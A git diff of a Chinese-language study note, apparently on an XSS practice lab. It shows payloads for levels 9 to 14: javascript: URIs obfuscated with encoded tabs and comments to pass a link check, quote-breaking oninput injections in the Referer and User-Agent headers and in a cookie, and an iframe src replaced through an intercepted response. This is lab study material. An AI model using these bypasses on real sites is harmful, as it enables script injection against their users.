@@ -60,7 +60,7 @@ payload：javasc&#13ript:alert(1)
 
 ## level9
 测试看到a标签考虑使用<a href="javascript:alert(1)"></a>，页面有回显的超链接，想办法将script转码一下。</br>
-`但是使用上一关的payload测试，发现一直提示链接不合法，测试得知必须使用http://才能链接合法，想办法将该字符塞入payload中，使用js代码的注释符注释http://`</br>
+但是使用上一关的payload测试，发现一直提示链接不合法，测试得知必须使用`http://`才能链接合法，想办法将该字符塞入payload中，使用js代码的注释符注释`http://`</br>
 ```java
 payload：javasc&#9ript:alert(1)/*http://*/
 payload：javasc&#9ript:alert(1)//http://
@@ -84,6 +84,29 @@ payload：Referer: 1" type="txt" oninput="alert(888)
 ```
 这种构造，会将t_ref隐藏域在页面显现，on事件触发条件为在输入框中输入任意值即触发XSS。</br>
 
+## level12
+与上一题一样，只不过输入点在User-Agent。</br>
+```java
+payload：User-Agent: 1" type="txt" oninput="alert(888)</br>
+```
+
+## level13
+与上一题一样，只不过输入点在cookie。</br>
+```java
+payload：user=1" type="txt" oninput="alert(888)</br>
+```
+
+## level14
+查看网页源码，看到<iframe src=></iframe>标签，就应该考虑设法在src处注入：src=javascript(1)。</br>
+<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(10).png height="300" width="650"></br>
+如何替换`src="http://www.exifviewer.org/"`中的网址成了我们要考虑的问题，进一步追踪该网页的来源，最后通过抓包在响应包中发现该网址。
+<img src=https://github.com/nathanzeng001/Sec-Note/blob/main/Image/Vulnerabilities/xss%20(11).png height="300" width="650"></br>
+那么我们的思路就清楚了，通过抓包，修改响应包的src值来控制输入内容，达到XSS目的。
+```java
+payload：src="javascript:alert(666)"
+```
+
+## level15
 
 
 
